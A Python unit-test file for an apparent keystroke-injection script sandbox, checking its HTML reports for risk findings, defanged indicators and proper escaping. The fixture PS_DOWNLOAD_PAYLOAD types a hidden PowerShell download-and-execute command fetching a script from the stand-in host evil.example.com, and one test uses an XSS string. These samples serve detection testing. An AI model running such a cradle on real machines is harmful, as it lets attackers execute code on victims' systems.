import unittest
from html.parser import HTMLParser

from duckysandbox import html_report
from duckysandbox.emulator import emulate


PS_DOWNLOAD_PAYLOAD = "\n".join([
    "GUI r",
    "DELAY 200",
    "STRING powershell -nop -w hidden -ep bypass -Command "
    "\"IEX (New-Object Net.WebClient).DownloadString('http://evil.example.com/a.ps1')\"",
    "ENTER",
])


class _TagBalanceChecker(HTMLParser):
    _VOID = {"meta", "link", "img", "br", "hr", "input"}

    def __init__(self):
        super().__init__()
        self.stack = []

    def handle_starttag(self, tag, attrs):
        if tag not in self._VOID:
            self.stack.append(tag)

    def handle_endtag(self, tag):
        assert self.stack and self.stack[-1] == tag, f"mismatched </{tag}>"
        self.stack.pop()


class TestHtmlFragment(unittest.TestCase):
    def setUp(self):
        self.result = emulate(PS_DOWNLOAD_PAYLOAD, target_os="windows")
        self.frag = html_report.render_html_fragment(self.result, payload_name="test.txt")

    def test_contains_risk_banner_and_findings(self):
        self.assertIn("risk-banner", self.frag)
        self.assertIn("EXEC-PS", self.frag)
        self.assertIn("C2-WEBCLIENT", self.frag)

    def test_contains_emoji_icons(self):
        self.assertIn("🦆", self.frag)
        self.assertIn("📋 Summary", self.frag)
        self.assertIn("🔎 Findings", self.frag)

    def test_process_tree_rendered(self):
        self.assertIn("process-tree", self.frag)
        self.assertIn("explorer.exe", self.frag)
        self.assertIn("powershell.exe", self.frag)

    def test_iocs_defanged(self):
        self.assertIn("hxxp://evil[.]example[.]com/a[.]ps1", self.frag)
        self.assertIn("evil[.]example[.]com", self.frag)


class TestHtmlEscaping(unittest.TestCase):
    def test_payload_content_is_escaped(self):
        text = "STRING <script>alert(1)</script> & \"quotes\" 'here'\nENTER\n"
        result = emulate(text, target_os="windows")
        frag = html_report.render_html_fragment(result, payload_name="<evil>.txt")
        self.assertNotIn("<script>alert(1)</script>", frag)
        self.assertIn("&lt;script&gt;alert(1)&lt;/script&gt;", frag)
        self.assertIn("&lt;evil&gt;.txt", frag)


class TestRenderHtmlDocument(unittest.TestCase):
    def test_full_document_is_well_formed_and_balanced(self):
        result = emulate(PS_DOWNLOAD_PAYLOAD, target_os="windows")
        doc = html_report.render_html(result, payload_name="test.txt")
        self.assertTrue(doc.startswith("<!DOCTYPE html>"))
        self.assertIn("<style>", doc)
        checker = _TagBalanceChecker()
        checker.feed(doc)
        self.assertEqual(checker.stack, [])

    def test_benign_payload_no_findings_section(self):
        result = emulate("STRING hello world\nENTER\n", target_os="windows")
        doc = html_report.render_html(result, payload_name="benign.txt")
        self.assertIn("No notable techniques were detected", doc)
        self.assertIn("No rule-based findings were triggered.", doc)


if __name__ == "__main__":
    unittest.main()
